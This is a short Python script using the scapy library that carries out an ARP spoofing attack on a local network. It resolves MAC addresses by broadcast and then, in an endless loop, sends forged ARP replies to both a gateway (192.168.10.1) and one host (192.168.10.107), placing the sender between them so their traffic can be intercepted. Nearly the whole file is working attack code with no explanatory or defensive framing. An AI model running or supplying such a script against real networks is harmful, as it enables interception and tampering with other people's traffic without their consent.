import time

from scapy.all import *
#  ac:f6:f7:b7:ba:63 LGElectr 192.168.10.107

# pkt2 = ARP(op = 2, pdst = "192.168.10.1", hwsrc = "ac:f6:f7:b7:ba:63")
# print(pkt.show())
pkt = ARP(op = 2, psrc = "192.168.10.1", pdst = "192.168.10.107", hwdst = "ac:f6:f7:b7:ba:63")

def get_mac(ip):
    arp_request = ARP(pdst = ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    ether_ip = broadcast/arp_request
    answered_list = srp(ether_ip, timeout = 2, verbose = False)[0] #answered list has a couple: (packet sent, response)
    mac_add = answered_list[0][1].hwsrc           #access (hardware source from response)
    return mac_add

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    pkt = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    send(pkt, verbose = False)


counter = 0
while True:
    counter += 1
    spoof("192.168.10.1", "192.168.10.107")
    spoof("192.168.10.107", "192.168.10.1")
    print(f"sent {counter} packets")
    time.sleep(2)

